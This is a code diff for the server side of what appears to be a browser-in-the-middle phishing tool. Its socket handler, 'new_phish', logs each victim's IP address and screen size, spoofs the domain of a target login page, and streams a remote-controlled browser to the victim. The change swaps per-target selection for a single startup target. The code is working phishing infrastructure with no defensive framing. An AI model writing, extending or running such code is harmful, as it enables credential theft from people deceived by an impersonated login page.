@@ -345,27 +345,16 @@ fastify.ready(async function(err){
       browser.socket_id = socket.id
     })
     socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
-      // Dynamically select target based on target_id parameter
-      const selectedTarget = targets[target_id] || target // fallback to startup target if target_id not found
-      
-      console.log(`Target ID received: ${target_id}`)
-      console.log(`Selected target: ${selectedTarget ? selectedTarget.login_page : 'NOT FOUND'}`)
-      console.log(`Available targets: ${Object.keys(targets).join(', ')}`)
-      
-      if (!selectedTarget) {
-        console.error(`Target '${target_id}' not found in targets.json`)
-        return // Don't process if target not found
-      }
-      
       empty_phishbowl.victim_ip = client_ip
       empty_phishbowl.victim_target_id = target_id
       empty_phishbowl.victim_width = viewport_width
       empty_phishbowl.victim_height = viewport_height
       
-      // Extract target domain from the login_page URL for URL spoofing
-      const targetUrl = new URL(selectedTarget.login_page)
+      // Extract target domain from the startup target's login_page URL for URL spoofing
+      const targetUrl = new URL(target.login_page)
       empty_phishbowl.spoofed_domain = targetUrl.hostname
       
+      console.log(`Using startup target: ${target.login_page}`)
       console.log(`Target domain set to: ${empty_phishbowl.spoofed_domain}`)
       
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
@@ -405,7 +394,7 @@ fastify.ready(async function(err){
       
       fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
       //console.log(empty_phishbowl)
-      empty_phishbowl = await get_browser(selectedTarget.login_page)
+      empty_phishbowl = await get_browser(target.login_page)
       browsers.push(empty_phishbowl)
     })
     socket.on('new_thumbnail', async function(thumbnail){
